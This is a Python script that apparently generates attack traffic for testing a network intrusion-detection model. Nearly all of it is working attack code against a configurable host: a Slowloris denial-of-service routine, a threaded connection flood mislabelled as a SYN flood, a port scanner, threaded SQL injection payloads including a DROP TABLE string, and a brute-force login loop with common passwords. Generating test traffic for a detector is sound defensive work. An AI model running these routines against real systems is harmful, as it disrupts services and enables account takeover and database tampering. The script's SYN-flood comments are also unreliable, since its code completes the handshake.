"""
Advanced Attack Simulation Script

This script simulates different types of attacks that the DVWA model can detect:
1. SYN Flood (DoS Attack)
2. Slowloris (Slow HTTP DoS)
3. Port Scanning
4. HTTP Flood with varied patterns

These attacks create network patterns that match the DVWA training data.
"""

import socket
import random
import time
import threading
from datetime import datetime
import sys
import argparse
import urllib.parse

try:
    import requests
except Exception:
    requests = None

# Configuration
TARGET_HOST = "127.0.0.1"  # Change to your target
TARGET_PORT = 80           # Change to your target port

class AttackSimulator:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_count = 0
        
    def syn_flood_attack(self, duration=60, threads=10):
        """
        SYN Flood Attack - Sends SYN packets without completing handshake
        This will be detected as Class 2 (Torshammer/DoS Attack)
        """
        print("\n" + "="*60)
        print("🔴 SYN FLOOD ATTACK")
        print("="*60)
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Threads: {threads}")
        print("\nThis attack sends SYN packets without completing handshake")
        print("Model should detect: Class 2 (DoS Attack)")
        print("="*60)
        
        def syn_thread():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    # Create socket with raw socket to send SYN
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    
                    # Try to connect but don't complete handshake
                    try:
                        s.connect((self.target_host, self.target_port))
                        # Immediately close to leave connection half-open
                        s.close()
                    except:
                        pass
                    
                    self.attack_count += 1
                    
                except Exception as e:
                    pass
                
                time.sleep(0.01)  # Small delay
        
        # Start threads
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=syn_thread)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Wait for completion
        for t in threads_list:
            t.join()
        
        print(f"\n✓ SYN Flood complete: {self.attack_count} packets sent")
    
    def slowloris_attack(self, duration=60, connections=50):
        """
        Slowloris Attack - Keeps connections open with slow requests
        This will be detected as Class 1 (Slowloris DoS)
        """
        print("\n" + "="*60)
        print("🐌 SLOWLORIS ATTACK")
        print("="*60)
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Connections: {connections}")
        print("\nThis attack keeps connections alive with slow requests")
        print("Model should detect: Class 1 (Slowloris DoS)")
        print("="*60)
        
        sockets = []
        
        # Create initial connections
        print(f"\nCreating {connections} slow connections...")
        for i in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_host, self.target_port))
                
                # Send incomplete HTTP request
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(f"Host: {self.target_host}\r\n".encode())
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                
                sockets.append(s)
            except Exception as e:
                pass
        
        print(f"✓ Created {len(sockets)} connections")
        
        # Keep connections alive by sending headers slowly
        end_time = time.time() + duration
        print(f"\nKeeping connections alive for {duration} seconds...")
        
        while time.time() < end_time:
            print(f"Active connections: {len(sockets)}", end="\r")
            
            for s in sockets[:]:
                try:
                    # Send a header line every few seconds to keep alive
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(s)
            
            time.sleep(10)  # Slow rate
            
            # Try to create new connections if some closed
            while len(sockets) < connections:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_host, self.target_port))
                    s.send(b"GET / HTTP/1.1\r\n")
                    s.send(f"Host: {self.target_host}\r\n".encode())
                    sockets.append(s)
                except:
                    break
        
        # Close all connections
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        print(f"\n✓ Slowloris complete")
    
    def port_scan_attack(self, port_range=(20, 100)):
        """
        Port Scanning - Scans multiple ports
        Creates reconnaissance patterns
        """
        print("\n" + "="*60)
        print("🔍 PORT SCANNING ATTACK")
        print("="*60)
        print(f"Target: {self.target_host}")
        print(f"Port range: {port_range[0]}-{port_range[1]}")
        print("\nThis attack scans for open ports")
        print("Model might detect unusual connection patterns")
        print("="*60)
        
        open_ports = []
        
        for port in range(port_range[0], port_range[1] + 1):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((self.target_host, port))
                
                if result == 0:
                    print(f"✓ Port {port}: OPEN")
                    open_ports.append(port)
                
                s.close()
                self.attack_count += 1
                
            except Exception as e:
                pass
            
            time.sleep(0.05)
        
        print(f"\n✓ Port scan complete: Found {len(open_ports)} open ports")
        if open_ports:
            print(f"  Open ports: {open_ports}")
    
    def mixed_attack(self, duration=60):
        """
        Mixed attack combining different patterns
        """
        print("\n" + "="*60)
        print("🎭 MIXED ATTACK (Multiple Types)")
        print("="*60)
        print(f"Duration: {duration} seconds")
        print("Combines: SYN flood + Slow connections + Port scans")
        print("="*60)
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            attack_type = random.choice(['syn', 'slow', 'scan'])
            
            if attack_type == 'syn':
                # Quick SYN flood burst
                for _ in range(10):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.1)
                        s.connect((self.target_host, self.target_port))
                        s.close()
                    except:
                        pass
            
            elif attack_type == 'slow':
                # Create slow connection
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_host, self.target_port))
                    s.send(b"GET / HTTP/1.1\r\n")
                    time.sleep(5)
                    s.close()
                except:
                    pass
            
            elif attack_type == 'scan':
                # Random port scan
                port = random.randint(20, 100)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect_ex((self.target_host, port))
                    s.close()
                except:
                    pass
            
            time.sleep(0.1)
        
        print(f"\n✓ Mixed attack complete")

    def sqli_attack(self, duration=60, threads=10, search_path="/search", item_path="/item"):
        """
        SQL Injection-like Attack - Sends many requests with SQLi payloads in query params
        Intended to match DVWA SQLi traffic patterns (Class 4)
        """
        if requests is None:
            print("requests library not available; install per requirements.txt")
            return

        print("\n" + "="*60)
        print("🧪 SQL INJECTION TRAFFIC")
        print("="*60)
        print(f"Target: http://{self.target_host}:{self.target_port}")
        print(f"Duration: {duration} seconds | Threads: {threads}")
        print(f"Endpoints: {search_path}, {item_path}")
        print("Sends common SQLi payloads in parameters (no real SQL executed)")
        print("Model should detect: Class 4 (SQL Injection)")
        print("="*60)

        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2,3 --",
            "1; DROP TABLE users; --",
            "' OR 'x'='x",
            """' OR '1'='1' /*""",
            "') OR ('1'='1",
        ]

        base = f"http://{self.target_host}:{self.target_port}"
        end_time = time.time() + duration

        def worker():
            sess = requests.Session()
            while time.time() < end_time:
                try:
                    p = random.choice(payloads)
                    # /search?q=...
                    url1 = f"{base}{search_path}?q={urllib.parse.quote(p)}"
                    sess.get(url1, timeout=3)
                    # /item?id=...
                    url2 = f"{base}{item_path}?id={urllib.parse.quote(p)}"
                    sess.get(url2, timeout=3)
                except Exception:
                    pass
                finally:
                    self.attack_count += 2
                # Small jitter
                time.sleep(random.uniform(0.01, 0.05))

        ts = []
        for _ in range(max(1, threads)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            ts.append(t)
        for t in ts:
            t.join()
        print(f"\n✓ SQLi traffic complete: ~{self.attack_count} requests sent")

    def brute_force_attack(self, duration=60, threads=10, login_path="/login"):
        """
        Brute Force Attack - Rapid repeated login attempts with wrong creds
        Intended to match DVWA Brute Force traffic patterns (Class 3)
        """
        if requests is None:
            print("requests library not available; install per requirements.txt")
            return

        print("\n" + "="*60)
        print("🔐 BRUTE FORCE TRAFFIC")
        print("="*60)
        print(f"Target: http://{self.target_host}:{self.target_port}{login_path}")
        print(f"Duration: {duration} seconds | Threads: {threads}")
        print("Sends many POST /login attempts with different creds")
        print("Model should detect: Class 3 (Brute Force)")
        print("="*60)

        usernames = ["admin", "user", "test", "guest", "root"]
        passwords = ["123456", "password", "admin", "letmein", "qwerty", "welcome", "passw0rd", "secret"]
        base = f"http://{self.target_host}:{self.target_port}{login_path}"
        end_time = time.time() + duration

        def worker():
            sess = requests.Session()
            attempts = 0
            while time.time() < end_time:
                try:
                    u = random.choice(usernames)
                    p = random.choice(passwords)
                    data = {"username": u, "password": p}
                    sess.post(base, timeout=3, data=data)
                    attempts += 1
                except Exception:
                    pass
                finally:
                    self.attack_count += 1
                # Tight loop with tiny sleep to keep rate high but not overwhelming
                time.sleep(random.uniform(0.01, 0.03))

        ts = []
        for _ in range(max(1, threads)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            ts.append(t)
        for t in ts:
            t.join()
        print(f"\n✓ Brute force traffic complete: ~{self.attack_count} attempts sent")


def main():
    print("="*60)
    print("ADVANCED ATTACK SIMULATION")
    print("="*60)
    print("\n[!] WARNING: For educational purposes only!")
    print("Only attack systems you own or have permission to test.\n")

    parser = argparse.ArgumentParser(description="Run dataset-aligned attack simulations (Slowloris, SQLi, Brute Force)")
    parser.add_argument("--host", default=TARGET_HOST, help="Target host/IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Target port (default: 80)")
    parser.add_argument("--mode", choices=["slowloris", "sqli", "brute", "all", "interactive"], default="interactive", help="Attack mode to run")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (where applicable)")
    parser.add_argument("--threads", type=int, default=20, help="Threads for SYN flood")
    parser.add_argument("--connections", type=int, default=50, help="Connections for Slowloris")
    parser.add_argument("--login-path", default="/login", help="Login path for brute force (default: /login)")
    parser.add_argument("--search-path", default="/search", help="Search path for SQLi (default: /search)")
    parser.add_argument("--item-path", default="/item", help="Item path for SQLi (default: /item)")
    args = parser.parse_args()

    # Interactive prompt if requested
    if args.mode == "interactive":
        # Configuration via prompt
        target_host = input(f"Enter target host (default: {args.host}): ").strip() or args.host
        try:
            target_port = int(input(f"Enter target port (default: {args.port}): ").strip() or args.port)
        except ValueError:
            target_port = args.port

        simulator = AttackSimulator(target_host, target_port)

        print("\n" + "="*60)
        print("SELECT DATASET-ALIGNED ATTACK:")
        print("="*60)
        print("1. Slowloris - Slow HTTP connections (Class 1)")
        print("2. SQL Injection - Parameter tampering traffic (Class 4)")
        print("3. Brute Force - Rapid login attempts (Class 3)")
        print("4. Run All (Slowloris → SQLi → Brute)")
        print("="*60)

        choice = input("\nEnter choice (1-4): ").strip()

        try:
            if choice == '1':
                simulator.slowloris_attack(duration=args.duration, connections=args.connections)
            elif choice == '2':
                simulator.sqli_attack(duration=args.duration, threads=max(10, args.threads//2), search_path=args.search_path, item_path=args.item_path)
            elif choice == '3':
                simulator.brute_force_attack(duration=args.duration, threads=max(10, args.threads//2), login_path=args.login_path)
            elif choice == '4':
                print("\n🔥 Running dataset-aligned attacks sequentially...")
                print("\nPhase 1/3: Slowloris")
                simulator.slowloris_attack(duration=max(30, args.duration//2), connections=max(25, args.connections))
                time.sleep(2)
                print("\nPhase 2/3: SQL Injection traffic")
                simulator.sqli_attack(duration=max(30, args.duration//2), threads=max(10, args.threads//2), search_path=args.search_path, item_path=args.item_path)
                time.sleep(2)
                print("\nPhase 3/3: Brute Force traffic")
                simulator.brute_force_attack(duration=max(30, args.duration//2), threads=max(10, args.threads//2), login_path=args.login_path)
            else:
                print("Invalid choice!")
                return

            print("\n" + "="*60)
            print("✅ ATTACK SIMULATION COMPLETE")
            print("="*60)
            print("\nNext steps:")
            print("1. Capture network traffic (if running): tcpdump or Wireshark")
            print("2. Extract features: python ai-model/run_cicflowmeter_py.py")
            print("3. Test model: python ai-model/test_model.py")

        except KeyboardInterrupt:
            print("\n\n⚠️  Attack interrupted by user")
        except Exception as e:
            print(f"\n❌ Error: {e}")
        return

    # Non-interactive mode
    simulator = AttackSimulator(args.host, args.port)
    try:
        if args.mode == "slowloris":
            simulator.slowloris_attack(duration=args.duration, connections=args.connections)
        elif args.mode == "sqli":
            simulator.sqli_attack(duration=args.duration, threads=max(10, args.threads//2), search_path=args.search_path, item_path=args.item_path)
        elif args.mode == "brute":
            simulator.brute_force_attack(duration=args.duration, threads=max(10, args.threads//2), login_path=args.login_path)
        elif args.mode == "all":
            print("\n🔥 Running dataset-aligned attacks sequentially...")
            print("\nPhase 1/3: Slowloris")
            simulator.slowloris_attack(duration=max(30, args.duration//2), connections=max(25, args.connections))
            time.sleep(2)
            print("\nPhase 2/3: SQL Injection traffic")
            simulator.sqli_attack(duration=max(30, args.duration//2), threads=max(10, args.threads//2), search_path=args.search_path, item_path=args.item_path)
            time.sleep(2)
            print("\nPhase 3/3: Brute Force traffic")
            simulator.brute_force_attack(duration=max(30, args.duration//2), threads=max(10, args.threads//2), login_path=args.login_path)

        print("\n" + "="*60)
        print("✅ ATTACK SIMULATION COMPLETE")
        print("="*60)
        print("\nNext steps:")
        print("1. Capture network traffic (if running): tcpdump or Wireshark")
        print("2. Extract features: python ai-model/run_cicflowmeter_py.py")
        print("3. Test model: python ai-model/test_model.py")

    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == "__main__":
    main()
